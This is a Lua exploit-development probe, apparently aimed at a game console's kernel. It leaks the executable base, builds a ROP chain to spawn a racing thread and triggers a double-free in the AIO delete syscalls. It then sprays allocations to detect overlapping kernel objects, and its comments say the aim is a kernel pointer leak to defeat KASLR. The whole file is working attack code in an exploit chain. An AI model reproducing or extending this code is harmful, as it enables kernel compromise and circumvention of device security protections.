-- CRASH_CLASS: MODERATE
-- PROBE 66d: AIO double-free overlap detection
--
-- Confirms that the double-free produces a malloc-level free-list loop.
-- After the loop, EVERY allocation from the 64-byte zone returns the
-- SAME address X. Two AIO completion records at X share memory.
-- Modify one → the other's data changes → proves overlap.
--
-- The completion record stores *(td+8) at offset +8 — a kernel pointer.
-- If we can observe it, that's KASLR defeat.
--
-- Uses the correct 669 convention from working probe 65l:
--   669(cmd=1, reqs_ptr, count=1, class=1, ids_out_ptr)
-- Plus /dev/zero fd, poll (664) before delete (662).

print("=== PROBE 66d: AIO OVERLAP DETECT ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then hi2 = hi2 + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi2
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)
local sf_lo, sf_hi = g_lohi(0x992)

-- Ignore SIGSYS + SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(uint64(N(sa) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero for AIO target
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- TCB for child threads
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

-- AIO helpers
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))          -- +0: flags
    wq(uint64(N(reqs) + 8), uint64(16))  -- +8: size
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- Helper: spawn child that calls 662(ids, count, states) via ROP
local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local CHILD_STK = 0x800
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
    local function push(val) wq(sp, val); sp = sp + 8 end

    -- sysarch(SET_FSBASE)
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- 662(ids, count, states)
    push(pop_rax_ret); push(uint64(662))
    push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count))
    push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Store return value
    push(pop_rdi_ret); push(uint64(N(shared) + done_off + 8))
    push(mov_rdi_rax)

    -- Done marker
    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    -- Exit
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared) + done_off, 0)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- =============================================
-- [A] Submit, poll, then race-delete → double-free
-- =============================================
print("")
print("-- A: double-free race --")

local BATCH = 16
local ids = memory.alloc(BATCH * 4)
local id_list = {}
local ok_submit = true

for i = 0, BATCH - 1 do
    local id = submit_one()
    if id == 0 then ok_submit = false; break end
    wd(N(ids) + i * 4, id)
    id_list[#id_list + 1] = id
end
print(string.format("submitted %d/%d IDs", #id_list, BATCH))

if #id_list < BATCH then
    print("submit failed - abort")
    print("=== 66d DONE ===")
    return
end

-- Poll all IDs (prerequisite for delete)
local poll_st = memory.alloc(BATCH * 4)
pcall(function()
    mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_st)))
end)

-- Race: main + child both call 662 on same IDs
local main_states = memory.alloc(BATCH * 4)
local child_states = memory.alloc(BATCH * 4)
for i = 0, BATCH * 4 - 1, 4 do
    wd(N(main_states) + i, 0xCD)
    wd(N(child_states) + i, 0xCD)
end

spawn_662_child(N(ids), BATCH, N(child_states), 0x100)

-- Main immediately calls 662
pcall(function()
    mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_states)))
end)

-- Wait for child
local dummy = 0
for w = 1, 200000 do dummy = dummy + 1 end

-- Count doubles
local doubles = 0
for i = 0, BATCH - 1 do
    local ms = rd(N(main_states) + i * 4) or 0xCD
    local cs = rd(N(child_states) + i * 4) or 0xCD
    if ms == 0 and cs == 0 then doubles = doubles + 1 end
end
print(string.format("doubles: %d/%d", doubles, BATCH))

if doubles == 0 then
    print("NO DOUBLES — race didn't trigger")
    print("Retrying with more iterations...")
end

-- =============================================
-- [B] After double-free: submit NEW requests and check for overlap
-- =============================================
print("")
print("-- B: post-double-free spray + overlap test --")

-- Submit BATCH * 2 new requests to reclaim freed blocks
local spray_ids = {}
for i = 1, BATCH * 2 do
    local id = submit_one()
    if id == 0 then break end
    spray_ids[#spray_ids + 1] = id
end
print(string.format("spray submitted: %d new IDs", #spray_ids))

-- Poll all spray IDs
for _, id in ipairs(spray_ids) do
    poll_one(id)
end

-- Check spray states
local spray_states_buf = memory.alloc(#spray_ids * 4 + 16)
local spray_ids_buf = memory.alloc(#spray_ids * 4 + 16)
for i = 1, #spray_ids do
    wd(N(spray_ids_buf) + (i-1) * 4, spray_ids[i])
    wd(N(spray_states_buf) + (i-1) * 4, 0xBB)
end
pcall(function()
    mk(664)(uint64(N(spray_ids_buf)), uint64(#spray_ids), uint64(N(spray_states_buf)))
end)

-- Print spray states to see if any are anomalous
local anomalous = 0
for i = 0, #spray_ids - 1 do
    local st = rd(N(spray_states_buf) + i * 4) or 0xBB
    if st ~= 0 and st ~= 0xBB and st ~= 0x80020003 and st ~= 0x80020010 then
        anomalous = anomalous + 1
        if anomalous <= 8 then
            print(string.format("  spray[%d] id=%d state=0x%08X", i, spray_ids[i+1], st))
        end
    end
end
print(string.format("anomalous states: %d/%d", anomalous, #spray_ids))

-- =============================================
-- [C] Overlap test: delete one spray ID, check if another changes
-- =============================================
print("")
print("-- C: overlap detection via delete + cross-check --")

-- If two completion records share the same memory, deleting one
-- corrupts the other's fields. The status query for the other
-- would return something unexpected.

local overlap_detected = 0

if #spray_ids >= 4 then
    -- Delete spray_ids[1], then check spray_ids[2..4]
    local del_id = spray_ids[1]
    local check_ids = {spray_ids[2], spray_ids[3], spray_ids[4]}

    -- Record states BEFORE delete
    local pre_states = {}
    for ci = 1, #check_ids do
        local cbuf = memory.alloc(8)
        wd(N(cbuf), check_ids[ci]); wd(N(cbuf) + 4, 0xBB)
        pcall(function() mk(664)(uint64(N(cbuf)), uint64(1), uint64(N(cbuf) + 4)) end)
        pre_states[ci] = rd(N(cbuf) + 4) or 0xBB
    end

    -- Delete spray_ids[1]
    local del_buf = memory.alloc(8)
    wd(N(del_buf), del_id); wd(N(del_buf) + 4, 0xBB)
    pcall(function() mk(662)(uint64(N(del_buf)), uint64(1), uint64(N(del_buf) + 4)) end)
    local del_st = rd(N(del_buf) + 4) or 0xBB
    print(string.format("  deleted id=%d state=0x%X", del_id, del_st))

    -- Check states AFTER delete
    for ci = 1, #check_ids do
        local cbuf = memory.alloc(8)
        wd(N(cbuf), check_ids[ci]); wd(N(cbuf) + 4, 0xBB)
        pcall(function() mk(664)(uint64(N(cbuf)), uint64(1), uint64(N(cbuf) + 4)) end)
        local post = rd(N(cbuf) + 4) or 0xBB
        if post ~= pre_states[ci] then
            overlap_detected = overlap_detected + 1
            print(string.format("  ★ OVERLAP: id=%d changed %X → %X after deleting id=%d",
                check_ids[ci], pre_states[ci], post, del_id))
        end
    end

    -- Also try: submit one more (reclaims the just-deleted block)
    -- and see if it gets the same data
    local new_id = submit_one()
    if new_id ~= 0 then
        poll_one(new_id)
        local nbuf = memory.alloc(8)
        wd(N(nbuf), new_id); wd(N(nbuf) + 4, 0xBB)
        pcall(function() mk(664)(uint64(N(nbuf)), uint64(1), uint64(N(nbuf) + 4)) end)
        local nst = rd(N(nbuf) + 4) or 0xBB
        print(string.format("  new alloc id=%d state=0x%X", new_id, nst))
    end
end

-- =============================================
-- [D] Sys 624 VM counter as overlap signal
-- =============================================
print("")
print("-- D: sys 624 delta across operations --")

local c1 = N(mk(624)())
-- Submit 4 AIO requests
for i = 1, 4 do submit_one() end
local c2 = N(mk(624)())
-- Delete 4 (normal, no race)
print(string.format("  624 delta for 4 submit: %d  (expect ~0, AIO uses malloc not mmap)", c2 - c1))

print(string.format("\noverlap detected: %d", overlap_detected))
print(string.format("doubles: %d", doubles))
print("alive=" .. (N(native.fcall_with_rax(stub, 20)) == pid_val and "YES" or "NO"))
print("=== 66d DONE ===")
